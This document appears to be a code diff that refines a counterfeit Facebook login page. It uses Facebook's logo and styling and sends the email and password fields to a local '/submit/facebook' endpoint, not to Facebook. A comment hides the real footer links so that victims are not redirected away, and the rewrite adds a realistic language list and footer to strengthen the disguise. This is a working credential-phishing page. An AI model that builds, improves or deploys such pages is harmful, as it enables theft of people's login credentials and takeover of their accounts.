@@ -1,45 +1,214 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Log into Facebook</title>
-<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yt/l/0,cross/JKaz7mlsNWj.css" crossorigin="anonymous">
-<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yx/l/0,cross/4JYV2uU2uqw.css" crossorigin="anonymous">
-<link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y1/l/0,cross/2nrv04yYtCI.css" crossorigin="anonymous">
-<style>
-/* Hide Facebook footer links to avoid redirecting away */
-#pageFooter, ._95ke, ._8opy { display: none !important; }
-.container {
-  max-width: 400px;
-  width: 90%;
-  margin: 50px auto;
-  padding: 20px;
-  background: white;
-  border-radius: 8px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-  text-align: center;
-}
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Log in to Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVHE.ico">
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column; /* Center content vertically */
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            margin: 40px auto; /* Add top margin */
+            padding: 20px;
+            max-width: 396px;
+            width: 90%;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .logo {
+            height: 106px; /* Approximate height */
+            margin: -28px auto 10px; /* Adjust positioning */
+        }
+        h2 {
+            font-size: 18px;
+            font-weight: normal;
+            color: #1c1e21;
+            margin-bottom: 20px;
+            line-height: 1.34;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            box-sizing: border-box; /* Include padding and border in width */
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        button[type="submit"] {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 6px; /* Add space above button */
+            margin-bottom: 16px;
+        }
+        button[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+        .links a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .links .forgot {
+            display: block;
+            margin-bottom: 16px; /* Space below forgot password */
+        }
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 16px;
+            text-align: center;
+        }
+        .create-account-button {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            text-decoration: none; /* For anchor tag styling */
+            display: inline-block; /* For anchor tag styling */
+            margin-top: 20px;
+        }
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        .page-footer {
+            color: #737373;
+            font-size: 12px;
+            margin-top: 20px; /* Space above footer */
+            text-align: center;
+            width: 100%;
+            padding-bottom: 20px; /* Space at bottom */
+        }
+        .page-footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .page-footer a:hover {
+            text-decoration: underline;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links span, .footer-links a {
+            margin: 0 5px;
+        }
+        /* Hide original FB footer elements if they somehow load */
+        #pageFooter, ._95ke, ._8opy { display: none !important; }
+
+        @media (max-width: 420px) {
+            .container {
+                margin-top: 20px;
+                box-shadow: none;
+                border: none;
+                border-radius: 0;
+            }
+            body {
+                background-color: #fff; /* Match container on small screens */
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-<img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" style="margin-bottom:20px;">
-<h2 style="margin-bottom:20px;">Log Into Facebook</h2>
-<form method="POST" action="/submit/facebook">
-<input type="text" name="email" placeholder="Email or phone number" required autofocus autocomplete="username" aria-label="Email or phone number" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;">
-<input type="password" name="pass" placeholder="Password" required autocomplete="current-password" aria-label="Password" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;">
-<button type="submit" style="width:90%;max-width:350px;margin:10px auto;box-sizing:border-box;">Log In</button>
-<div style="margin-top:15px;">
-<a href="#">Forgot account?</a> · <a href="#">Sign up for Facebook</a>
-</div>
-</form>
-<div style="background:#f7f7f7; padding:10px; font-size:12px; color:#555; margin-top:15px;">
-By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
-</div>
-<div class="footer" style="margin-top:20px; font-size:12px; color:#777;">
-Facebook © 2025
-</div>
-</div>
+    <div class="container">
+        <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+        <h2>Log in to Facebook</h2>
+        <form method="POST" action="/submit/facebook">
+            <input type="text" name="email" placeholder="Email address or phone number" required autofocus autocomplete="username" aria-label="Email address or phone number">
+            <input type="password" name="pass" placeholder="Password" required autocomplete="current-password" aria-label="Password">
+            <button type="submit">Log In</button>
+            <div class="links">
+                <a class="forgot" href="#">Forgotten password?</a>
+            </div>
+            <div class="divider"></div>
+            <a href="#" class="create-account-button">Create new account</a>
+        </form>
+    </div>
+    <div class="page-footer">
+        <div class="footer-links">
+            <span>English (UK)</span>
+            <a href="#">中文(简体)</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">日本語</a>
+            <a href="#">Español</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Italiano</a>
+            <a href="#">한국어</a>
+            <a href="#">العربية</a>
+            <a href="#">हिन्दी</a>
+            <!-- Add more languages as needed -->
+        </div>
+        <div class="footer-links">
+            <a href="#">Sign Up</a>
+            <a href="#">Log In</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Video</a>
+            <a href="#">Places</a>
+            <a href="#">Games</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Meta Store</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Imagine with Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Fundraisers</a>
+        </div>
+         <div class="footer-links">
+            <a href="#">Services</a>
+            <a href="#">Voting Information Centre</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Privacy Centre</a>
+            <a href="#">Groups</a>
+            <a href="#">About</a>
+            <a href="#">Create ad</a>
+            <a href="#">Create Page</a>
+            <a href="#">Developers</a>
+            <a href="#">Careers</a>
+            <a href="#">Cookies</a>
+            <a href="#">AdChoices</a>
+            <a href="#">Terms</a>
+            <a href="#">Help</a>
+            <a href="#">Contact uploading and non-users</a>
+        </div>
+        <div>Meta © 2025</div>
+    </div>
 </body>
 </html>
